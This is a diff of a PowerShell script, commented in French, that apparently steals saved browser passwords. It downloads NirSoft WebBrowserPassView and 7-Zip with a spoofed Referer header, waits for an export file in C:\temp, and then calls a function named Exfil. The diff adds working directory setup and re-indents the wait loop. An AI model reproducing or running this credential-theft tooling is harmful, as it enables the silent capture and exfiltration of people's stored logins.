@@ -1,4 +1,7 @@
 function Get-Nirsoft {
+    cd C:\
+    mkdir \temp
+    cd \temp
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
@@ -124,12 +127,12 @@ function Del-Nirsoft-File {
 
 function Wait4Setup{
 # Attendre la création de C:\temp\export.txt
-do {
-    Start-Sleep -Seconds 2
-} until (Test-Path "C:\temp\export.txt")
+    do {
+        Start-Sleep -Seconds 2
+    } until (Test-Path "C:\temp\export.txt")
 
 # Appeler la fonction Exfil
-Exfil
+    Exfil
 }
 
 # Délai de 15 secondes (ajustez selon vos besoins)
